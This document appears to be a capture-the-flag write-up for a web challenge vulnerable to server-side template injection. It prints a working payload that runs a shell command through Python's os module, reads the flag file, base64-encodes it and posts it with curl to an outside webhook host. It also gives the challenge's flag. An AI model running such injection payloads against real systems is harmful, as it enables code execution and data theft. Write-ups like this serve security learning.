## Question
The attempted attempt to tempt the untempted into a tempting but contemptible scheme was an untempting temptation that exemplified not only contempt but also a preemptive exemption from any redemptive attempts.

## Solution
Here we've been given a website which looks like this.
![image](https://github.com/user-attachments/assets/993c6b48-9f42-4ce4-9f0b-146d13aae219)

we aren't allowed to see source, which gives an interesting angle to the challenge.

Assuming this being SSTI, we wrote a command `${__import__('os').popen('cat /tmp/fla* | base64 | curl -X POST -d @- https://webhook.site/d9136a16-8404-4142-ac08-00a03be64ef5').read()}`
which sends the post to the webhook which we can create and we'll get the flag in base64 encoded which when decoded will get the flag.
![image](https://github.com/user-attachments/assets/b7fc1e65-1ac0-4795-b57c-6699d195fe7a)

`flag: ENO{T3M_Pl4T_3S_4r3_S3cUre!!}`

